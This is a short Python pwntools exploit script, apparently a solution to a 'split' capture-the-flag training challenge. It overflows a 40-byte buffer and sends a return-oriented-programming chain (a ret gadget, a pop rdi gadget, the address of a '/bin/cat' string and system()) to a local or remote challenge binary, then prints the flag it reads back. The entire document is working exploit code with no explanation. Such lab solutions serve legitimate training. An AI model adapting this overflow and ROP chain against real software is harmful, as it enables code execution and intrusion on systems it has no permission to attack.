#!/usr/bin/env python3

from pwn import *

exe = ELF("./split_patched")

context.binary = exe
rop = ROP(exe)

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("addr", 1337)

    return r


def main():
    r = conn()

    # good luck pwning :)

    system = 0x400560
    bincat = 0x601060
    rdi = 0x4007c3
    ret = 0x40053e
    offset = 40
    payload = flat(b'A'*offset + p64(ret) + p64(rdi) + p64(bincat) + p64(system))
    r.sendlineafter(b'>', payload)

    r.recv()
    r.recv()
    flag = r.readline()
    print(flag)

if __name__ == "__main__":
    main()
